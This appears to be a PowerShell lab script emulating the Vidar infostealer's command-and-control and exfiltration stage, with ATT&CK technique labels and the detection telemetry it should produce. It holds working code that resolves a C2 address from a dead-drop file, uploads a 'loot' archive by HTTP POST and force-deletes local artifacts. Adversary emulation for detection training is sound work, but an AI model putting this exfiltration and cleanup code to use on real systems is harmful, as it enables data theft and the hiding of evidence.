<#
.SYNOPSIS
    Week 8 - Vidar emulation - Step 4: C2 / Exfiltration
    ATT&CK: T1102.001 (Dead Drop Resolver), T1041 (Exfiltration Over C2 Channel),
            T1070.004 (File Deletion - self cleanup)

.DESCRIPTION
    THIS SCRIPT ONLY TALKS TO YOUR OWN LAB SERVER (server/exfil_server.py).
    It never contacts the real internet. It simulates:
      1. Fetching a "C2 address" from a dead-drop-style text file on the lab
         server (mimicking Vidar's known pattern of pulling its C2 from a
         public profile).
      2. Uploading the loot ZIP created in Step 3 via HTTP POST.
      3. Deleting local artifacts afterward (self-cleanup).

    Run on an ISOLATED LAB VM ONLY, pointed at your own lab server IP.
#>

param(
    [string]$DeadDropUrl = "http://192.168.56.10:8000/deaddrop.txt",   # change to your lab server
    [string]$LootZip     = "C:\Temp\emu_loot.zip",
    [string]$EmuRoot     = "C:\Temp\EmuVidarProfile",
    [string]$MarkerPath  = "C:\Temp\emu_marker.txt"
)

Write-Host "[*] Week 8 Emulation - Step 4: C2 / Exfiltration" -ForegroundColor Cyan

# --- T1102.001: resolve "C2" from a dead-drop-style text resource ---
Write-Host "[*] Resolving C2 address from dead drop: $DeadDropUrl" -ForegroundColor Yellow
try {
    $c2Address = (Invoke-WebRequest -Uri $DeadDropUrl -UseBasicParsing -TimeoutSec 5).Content.Trim()
} catch {
    Write-Host "[!] Could not reach dead drop. Falling back to default lab C2." -ForegroundColor Red
    $c2Address = "http://192.168.56.10:8000/upload"
}
Write-Host "[+] Resolved C2 upload endpoint: $c2Address" -ForegroundColor Green

# --- T1041: exfiltrate the loot archive over HTTP POST ---
if (Test-Path $LootZip) {
    Write-Host "[*] Uploading loot archive to lab C2..." -ForegroundColor Yellow
    try {
        Invoke-WebRequest -Uri $c2Address -Method Post -InFile $LootZip `
            -ContentType "application/octet-stream" -UseBasicParsing -TimeoutSec 10 | Out-Null
        Write-Host "[+] Upload complete." -ForegroundColor Green
    } catch {
        Write-Host "[!] Upload failed: $_" -ForegroundColor Red
    }
} else {
    Write-Host "[!] Loot archive not found at $LootZip - run step3_collection.ps1 first." -ForegroundColor Red
}

# --- T1070.004: self-deletion / cleanup of local artifacts ---
Write-Host "[*] Cleaning up local emulation artifacts (self-deletion behavior)..." -ForegroundColor Yellow
foreach ($path in @($LootZip, $EmuRoot, $MarkerPath)) {
    if (Test-Path $path) {
        Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
    }
}

Write-Host "[+] Step 4 complete." -ForegroundColor Green
Write-Host "[i] Expected telemetry: Sysmon EID 3 (network connection), EID 22 (DNS)," -ForegroundColor DarkGray
Write-Host "    proxy/firewall logs showing POST with large body, file deletion events after upload" -ForegroundColor DarkGray
